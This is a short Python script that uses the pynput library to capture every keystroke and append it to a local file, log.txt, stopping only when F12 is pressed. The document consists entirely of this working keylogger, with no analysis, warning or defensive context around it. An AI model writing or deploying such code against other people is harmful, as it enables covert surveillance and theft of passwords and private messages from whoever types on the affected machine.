from pynput.keyboard import Listener

def onKeyLogger(key):
    key = str(key)
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.enter":
        key = "\n"
    with open("log.txt", "a") as file:
        file.write(key)
with Listener(on_press=onKeyLogger) as listener:
    listener.join()